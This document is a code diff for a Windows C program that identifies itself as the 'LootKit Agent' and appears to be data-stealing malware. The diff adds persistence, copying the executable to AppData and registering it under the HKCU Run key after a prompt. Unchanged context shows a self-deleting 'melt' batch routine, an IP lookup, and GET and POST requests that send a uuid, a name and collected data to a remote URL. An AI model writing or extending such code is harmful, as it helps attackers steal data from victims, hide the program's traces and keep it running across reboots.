@@ -2,35 +2,76 @@
 #include <stdlib.h>
 #include <windows.h>
 #include <wininet.h>
+#include <libgen.h>
+#include <shlobj.h>
 
 #ifdef MELT_SELECT
-void melt_file(char *filepath) {
+void melt_file(char *filepath)
+{
     FILE *fp;
     fp = fopen("delete_me.bat", "w");
-    if(fp == NULL) {
+    if (fp == NULL)
+    {
         perror("Error opening file");
         exit(1);
     }
-    
+
     fprintf(fp, "@echo off\n"
-            ":loop\n"
-            "timeout /t 1 >nul\n"
-            "del \"%s\"\n"
-            "if exist \"%s\" goto loop\n"
-            "start /b \"\" cmd /c del \"%%~f0\" & exit\n", filepath, filepath);
-    
+                ":loop\n"
+                "timeout /t 1 >nul\n"
+                "del \"%s\"\n"
+                "if exist \"%s\" goto loop\n"
+                "start /b \"\" cmd /c del \"%%~f0\" & exit\n",
+            filepath, filepath);
+
     fclose(fp);
     system("start delete_me.bat");
 }
 #endif
 
-void send_get_request(char *full_url) {
+#ifdef STARTUP_SELECT
+void add_to_startup(char *filepath)
+{
+    int response = MessageBoxA(NULL, "Do you want to add this program to startup?", "Permission Required", MB_YESNO);
+
+    if (response == IDYES)
+    { // Corrected here
+        // Get the AppData directory
+        char appDataPath[MAX_PATH];
+        if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, appDataPath)))
+        {
+            // Extract the filename from filepath
+            char *filename = basename(filepath);
+
+            // Construct the path where the executable will be copied
+            char newFilePath[MAX_PATH];
+            snprintf(newFilePath, sizeof(newFilePath), "%s\\%s", appDataPath, filename);
+
+            // Copy the file
+            if (CopyFileA(filepath, newFilePath, FALSE))
+            {
+                HKEY hKey;
+                const char *czStartName = "MyProgram";
+                if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS)
+                {
+                    RegSetValueExA(hKey, czStartName, 0, REG_SZ, (BYTE *)newFilePath, strlen(newFilePath) + 1);
+                    RegCloseKey(hKey);
+                }
+            }
+        }
+    }
+}
+#endif
+
+void send_get_request(char *full_url)
+{
     HINTERNET hInternet = InternetOpenA("LootKit Agent", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
     HINTERNET hSession = InternetOpenUrlA(hInternet, full_url, NULL, 0, INTERNET_FLAG_PRAGMA_NOCACHE | INTERNET_FLAG_KEEP_CONNECTION, 0);
     InternetCloseHandle(hSession);
 }
 
-char* get_ip_info() {
+char *get_ip_info()
+{
     char *ip_url = "https://ip.nf/me.json";
     HINTERNET hInternet2 = InternetOpenA("Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
     HINTERNET hSession2 = InternetOpenUrlA(hInternet2, ip_url, NULL, 0, INTERNET_FLAG_PRAGMA_NOCACHE | INTERNET_FLAG_KEEP_CONNECTION, 0);
@@ -47,7 +88,8 @@ char* get_ip_info() {
     return buffer;
 }
 
-void send_post_request(char *full_url, char *buffer, DWORD totalBytesRead) {
+void send_post_request(char *full_url, char *buffer, DWORD totalBytesRead)
+{
     char hostname[256];
     char path[1024];
     sscanf(full_url, "https://%255[^/]%1023s", hostname, path);
@@ -84,8 +126,18 @@ int main(int argc, char *argv[])
     char *full_url = malloc(strlen(url) + strlen(uuid) + strlen(name) + 20);
     sprintf(full_url, "%s?uuid=%s&name=%s", url, uuid, name);
 
+#ifdef STARTUP_SELECT
+    if (argc == 0)
+    {
+        fprintf(stderr, "Error: argv[0] is not available.\n");
+        return 1;
+    }
+    add_to_startup(argv[0]);
+#endif
+
 #ifdef MELT_SELECT
-    if(argc == 0) {
+    if (argc == 0)
+    {
         fprintf(stderr, "Error: argv[0] is not available.\n");
         return 1;
     }
